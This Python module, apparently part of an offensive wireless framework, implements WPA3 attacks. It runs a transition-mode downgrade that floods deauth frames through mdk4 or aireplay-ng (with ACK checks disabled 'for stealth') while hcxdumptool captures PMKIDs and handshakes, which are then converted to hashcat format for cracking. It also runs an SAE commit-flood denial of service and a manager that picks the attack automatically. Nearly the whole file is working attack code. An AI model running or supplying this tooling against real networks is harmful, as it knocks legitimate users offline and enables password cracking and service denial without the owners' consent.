"""
WPA3 Attack Module - Attack vectors for WPA3/SAE networks.

Implements real attack vectors:
1. Downgrade Attack: Force WPA2 on transition-mode networks
   - Deauth clients (reason 13 = invalid IE) to block SAE
   - Capture PMKID/handshake from WPA2 fallback
   - Uses hcxdumptool for capture, mdk4/aireplay-ng for deauth
2. SAE Flood Attack: DoS via commit frame flooding (Dragonblood)
   - Overwhelms AP with authentication frames
   - Uses mdk4 auth DoS mode
3. OWE Downgrade: Force open network on OWE transition

Requirements:
- hcxdumptool, hcxpcapngtool (hcxtools package)
- mdk4 or aireplay-ng (for deauth/flood)
- WiFi adapter in monitor mode with injection support
"""

from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from datetime import datetime, timezone

UTC = timezone.utc
from enum import Enum
from pathlib import Path
from typing import Any

from .wpa3_detector import PMFStatus, SAEStatus, WPA3Capabilities

logger = logging.getLogger(__name__)


class AttackType(str, Enum):
    """WPA3 attack types."""
    DOWNGRADE = "downgrade"
    SAE_FLOOD = "sae_flood"
    SAE_CAPTURE = "sae_capture"
    OWE_DOWNGRADE = "owe_downgrade"
    EVIL_TWIN = "evil_twin"


class AttackStatus(str, Enum):
    """Attack execution status."""
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    CANCELLED = "cancelled"


@dataclass
class AttackResult:
    """Result of a WPA3 attack."""
    attack_type: AttackType
    target_bssid: str
    target_ssid: str
    status: AttackStatus
    success: bool = False
    message: str = ""
    captured_file: str | None = None
    started_at: datetime = field(default_factory=lambda: datetime.now(UTC))
    completed_at: datetime | None = None
    duration_seconds: float = 0.0
    packets_sent: int = 0
    clients_affected: int = 0

    def to_dict(self) -> dict[str, Any]:
        return {
            "attack_type": self.attack_type.value,
            "target_bssid": self.target_bssid,
            "target_ssid": self.target_ssid,
            "status": self.status.value,
            "success": self.success,
            "message": self.message,
            "captured_file": self.captured_file,
            "started_at": self.started_at.isoformat(),
            "completed_at": self.completed_at.isoformat() if self.completed_at else None,
            "duration_seconds": round(self.duration_seconds, 2),
            "packets_sent": self.packets_sent,
        }


class DowngradeAttack:
    """
    WPA3 Transition Mode Downgrade Attack.

    Forces clients off WPA3-SAE and onto WPA2-PSK by:
    1. Injecting deauth frames with reason code 13 (Invalid Information Element)
       This specific reason signals that SAE parameters are invalid, causing
       clients to fall back to WPA2 association.
    2. Simultaneously capturing traffic with hcxdumptool to grab:
       - PMKID from initial association (clientless)
       - 4-way handshake from reconnecting clients
    3. Converting captures to hashcat format (mode 22000) for cracking.

    Requirements:
    - Target must be in WPA3 transition mode (both SAE and PSK in RSN IE)
    - PMF should be optional/disabled for deauth to work
    - Monitor mode interface with injection capability
    """

    def __init__(
        self,
        interface: str = "wlan0",
        output_dir: Path | None = None,
    ):
        self.interface = interface
        self.output_dir = output_dir or Path("captures/wpa3")
        self._running = False
        self._process: asyncio.subprocess.Process | None = None
        self._stats = {
            "attacks_total": 0,
            "downgrades_successful": 0,
            "handshakes_captured": 0,
        }

    async def execute(
        self,
        target: WPA3Capabilities,
        duration: int = 60,
        deauth_interval: int = 5,
    ) -> AttackResult:
        """
        Execute downgrade attack on a WPA3 transition-mode AP.

        Args:
            target: Target AP capabilities (must be downgradable)
            duration: Total attack duration in seconds
            deauth_interval: Seconds between deauth bursts

        Returns:
            AttackResult with captured handshake path if successful
        """
        result = AttackResult(
            attack_type=AttackType.DOWNGRADE,
            target_bssid=target.bssid,
            target_ssid=target.ssid,
            status=AttackStatus.RUNNING,
        )

        self._stats["attacks_total"] += 1

        # Validate target is actually downgradable
        if not target.is_downgradable:
            result.status = AttackStatus.FAILED
            result.message = "Target not in transition mode - downgrade not possible"
            return result

        if target.pmf_status == PMFStatus.REQUIRED:
            result.status = AttackStatus.FAILED
            result.message = "PMF required - deauth frames blocked; consider evil twin instead"
            return result

        self._running = True
        self.output_dir.mkdir(parents=True, exist_ok=True)

        try:
            timestamp = int(datetime.now(UTC).timestamp())
            bssid_clean = target.bssid.replace(":", "")
            capture_file = self.output_dir / f"downgrade_{bssid_clean}_{timestamp}.pcapng"

            # Start hcxdumptool capture (captures PMKIDs and handshakes)
            proc = await asyncio.create_subprocess_exec(
                "hcxdumptool",
                "-i", self.interface,
                "-w", str(capture_file),
                "--filterlist_ap", bssid_clean.lower(),
                "--filtermode=2",       # Include only listed BSSIDs
                "--enable_status=1",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            self._process = proc

            # Send deauth bursts with reason 13 (invalid IE) to disrupt SAE
            start_time = asyncio.get_event_loop().time()
            deauth_count = 0

            while self._running and (asyncio.get_event_loop().time() - start_time) < duration:
                await self._send_deauth(target.bssid, reason=13)
                deauth_count += 1
                result.packets_sent += 10  # Each burst sends ~10 frames
                await asyncio.sleep(deauth_interval)

            # Stop capture
            if proc.returncode is None:
                proc.terminate()
                try:
                    await asyncio.wait_for(proc.wait(), timeout=5.0)
                except TimeoutError:
                    proc.kill()

            # Convert capture to hashcat format
            if capture_file.exists() and capture_file.stat().st_size > 100:
                hash_file = await self._convert_capture(capture_file)
                if hash_file and hash_file.exists():
                    result.status = AttackStatus.SUCCESS
                    result.success = True
                    result.captured_file = str(hash_file)
                    result.message = (
                        f"Captured handshake/PMKID after {deauth_count} deauth bursts. "
                        f"Hash file: {hash_file}"
                    )
                    self._stats["handshakes_captured"] += 1
                    self._stats["downgrades_successful"] += 1
                else:
                    result.status = AttackStatus.FAILED
                    result.message = "Capture collected but no handshake/PMKID found"
            else:
                result.status = AttackStatus.FAILED
                result.message = "No capture data collected (check interface/permissions)"

        except FileNotFoundError:
            result.status = AttackStatus.FAILED
            result.message = "hcxdumptool not found - install hcxtools package"
        except Exception as e:
            result.status = AttackStatus.FAILED
            result.message = f"Attack error: {e}"
            logger.error("Downgrade attack error: %s", e)
        finally:
            self._running = False
            result.completed_at = datetime.now(UTC)
            result.duration_seconds = (result.completed_at - result.started_at).total_seconds()

        return result

    async def _send_deauth(self, bssid: str, reason: int = 13) -> None:
        """
        Send deauth frames using mdk4 or aireplay-ng.

        Reason 13 = "Invalid information element" - specifically blocks SAE
        by signaling that the WPA3 parameters in the AP's beacon are invalid,
        causing clients to attempt WPA2 association instead.
        """
        try:
            # Prefer mdk4 for targeted deauth
            proc = await asyncio.create_subprocess_exec(
                "mdk4", self.interface, "d",
                "-B", bssid,
                "-c", "1",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await asyncio.wait_for(proc.wait(), timeout=3.0)
        except (FileNotFoundError, TimeoutError):
            # Fallback to aireplay-ng
            try:
                proc = await asyncio.create_subprocess_exec(
                    "aireplay-ng",
                    "--deauth", "5",
                    "-a", bssid,
                    "-D",  # Disable ACK check for stealth
                    self.interface,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                await asyncio.wait_for(proc.wait(), timeout=5.0)
            except (FileNotFoundError, TimeoutError):
                logger.debug("No deauth tool available (mdk4/aireplay-ng)")

    async def _convert_capture(self, pcapng_file: Path) -> Path | None:
        """Convert pcapng to hashcat 22000 format using hcxpcapngtool."""
        hash_file = pcapng_file.with_suffix(".22000")
        try:
            proc = await asyncio.create_subprocess_exec(
                "hcxpcapngtool",
                "-o", str(hash_file),
                str(pcapng_file),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            await proc.wait()
            if hash_file.exists() and hash_file.stat().st_size > 0:
                return hash_file
        except (FileNotFoundError, Exception) as e:
            logger.error("hcxpcapngtool conversion error: %s", e)
        return None

    async def stop(self) -> None:
        """Stop running attack."""
        self._running = False
        if self._process and self._process.returncode is None:
            self._process.terminate()

    def get_stats(self) -> dict[str, Any]:
        return self._stats.copy()


class SAEFloodAttack:
    """
    SAE Commit Flood Attack (Dragonblood DoS).

    Floods the target AP with SAE authentication commit frames:
    - Causes high CPU load on AP (SAE uses heavy crypto: ECC/Dragonfly)
    - Denies service to legitimate WPA3 clients
    - May reveal timing side-channels for password analysis

    Uses mdk4 authentication DoS mode.
    """

    def __init__(self, interface: str = "wlan0"):
        self.interface = interface
        self._running = False
        self._stats = {
            "floods_total": 0,
            "frames_sent": 0,
        }

    async def execute(
        self,
        target: WPA3Capabilities,
        duration: int = 30,
        rate: int = 100,
    ) -> AttackResult:
        """
        Execute SAE commit flood attack.

        Args:
            target: Target AP (must support SAE)
            duration: Attack duration in seconds
            rate: Approximate frames per second
        """
        result = AttackResult(
            attack_type=AttackType.SAE_FLOOD,
            target_bssid=target.bssid,
            target_ssid=target.ssid,
            status=AttackStatus.RUNNING,
        )

        self._stats["floods_total"] += 1

        if target.sae_status == SAEStatus.NOT_SUPPORTED:
            result.status = AttackStatus.FAILED
            result.message = "Target does not support SAE - flood not effective"
            return result

        self._running = True

        try:
            # mdk4 mode 'a' = authentication DoS
            proc = await asyncio.create_subprocess_exec(
                "mdk4", self.interface, "a",
                "-a", target.bssid,
                "-m",  # Use valid client MACs
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            await asyncio.sleep(duration)

            if proc.returncode is None:
                proc.terminate()
                try:
                    await asyncio.wait_for(proc.wait(), timeout=5.0)
                except TimeoutError:
                    proc.kill()

            estimated_frames = rate * duration
            result.status = AttackStatus.SUCCESS
            result.success = True
            result.packets_sent = estimated_frames
            result.message = f"Sent ~{estimated_frames} SAE flood frames over {duration}s"
            self._stats["frames_sent"] += estimated_frames

        except FileNotFoundError:
            result.status = AttackStatus.FAILED
            result.message = "mdk4 not found - install mdk4 package"
        except Exception as e:
            result.status = AttackStatus.FAILED
            result.message = f"SAE flood error: {e}"
        finally:
            self._running = False
            result.completed_at = datetime.now(UTC)
            result.duration_seconds = (result.completed_at - result.started_at).total_seconds()

        return result

    async def stop(self) -> None:
        """Stop flood attack."""
        self._running = False

    def get_stats(self) -> dict[str, Any]:
        return self._stats.copy()


class WPA3AttackManager:
    """
    Unified WPA3 attack manager.

    Coordinates attack selection and execution based on target capabilities.
    Automatically selects the best attack vector if not specified.

    Usage:
        manager = WPA3AttackManager("wlan0mon")
        await manager.start()

        # Auto-select best attack
        result = await manager.attack(target_caps)

        # Or specify attack type
        result = await manager.attack(target_caps, attack_type=AttackType.DOWNGRADE)

        print(result.to_dict())
    """

    def __init__(
        self,
        interface: str = "wlan0",
        output_dir: Path | None = None,
    ):
        self.interface = interface
        self.output_dir = output_dir or Path("captures/wpa3")

        self._downgrade = DowngradeAttack(interface, output_dir=self.output_dir)
        self._sae_flood = SAEFloodAttack(interface)

        self._running = False
        self._current_attack: AttackResult | None = None
        self._history: list[AttackResult] = []

    async def start(self) -> bool:
        """Initialize attack manager."""
        self._running = True
        self.output_dir.mkdir(parents=True, exist_ok=True)
        logger.info("WPA3 attack manager started on %s", self.interface)
        return True

    async def stop(self) -> None:
        """Stop all running attacks."""
        self._running = False
        await self._downgrade.stop()
        await self._sae_flood.stop()

    async def attack(
        self,
        target: WPA3Capabilities,
        attack_type: AttackType | None = None,
        duration: int = 60,
    ) -> AttackResult:
        """
        Execute attack on target.

        If attack_type is None, auto-selects based on target capabilities:
        - Transition mode -> Downgrade attack
        - Pure WPA3 with SAE -> SAE flood (DoS)
        - OWE transition -> OWE downgrade
        """
        if attack_type is None:
            attack_type = self._select_best_attack(target)

        logger.info(
            "Attacking %s (%s) with %s",
            target.ssid, target.bssid, attack_type.value
        )

        if attack_type == AttackType.DOWNGRADE:
            result = await self._downgrade.execute(target, duration=duration)
        elif attack_type == AttackType.SAE_FLOOD:
            result = await self._sae_flood.execute(target, duration=duration)
        else:
            result = AttackResult(
                attack_type=attack_type,
                target_bssid=target.bssid,
                target_ssid=target.ssid,
                status=AttackStatus.FAILED,
                message=f"Attack type {attack_type.value} not yet implemented",
            )

        self._current_attack = result
        self._history.append(result)
        return result

    def _select_best_attack(self, target: WPA3Capabilities) -> AttackType:
        """Select optimal attack based on target capabilities."""
        if target.is_downgradable:
            return AttackType.DOWNGRADE
        elif target.owe_transition:
            return AttackType.OWE_DOWNGRADE
        elif target.sae_status != SAEStatus.NOT_SUPPORTED:
            return AttackType.SAE_FLOOD
        else:
            return AttackType.DOWNGRADE  # Fallback attempt

    def get_recommendations(self, target: WPA3Capabilities) -> list[dict[str, Any]]:
        """Get attack recommendations for a target."""
        recommendations = []
        for rec in target.attack_recommendations:
            attack_name = rec.split(":")[0].strip()
            description = rec.split(":", 1)[1].strip() if ":" in rec else ""
            recommendations.append({
                "attack": attack_name,
                "description": description,
                "likelihood": "high" if target.is_downgradable else "medium",
            })
        return recommendations

    def get_history(self) -> list[dict[str, Any]]:
        """Get attack history."""
        return [r.to_dict() for r in self._history]

    def get_stats(self) -> dict[str, Any]:
        """Get combined statistics."""
        return {
            "downgrade": self._downgrade.get_stats(),
            "sae_flood": self._sae_flood.get_stats(),
            "total_attacks": len(self._history),
            "successful_attacks": sum(1 for r in self._history if r.success),
        }

    def get_metrics(self) -> dict[str, Any]:
        """Prometheus-compatible metrics."""
        stats = self.get_stats()
        return {
            "posframework_wpa3_attacks_total": stats["total_attacks"],
            "posframework_wpa3_attacks_successful": stats["successful_attacks"],
            "posframework_wpa3_downgrades": stats["downgrade"]["attacks_total"],
            "posframework_wpa3_handshakes": stats["downgrade"]["handshakes_captured"],
            "posframework_wpa3_floods": stats["sae_flood"]["floods_total"],
        }
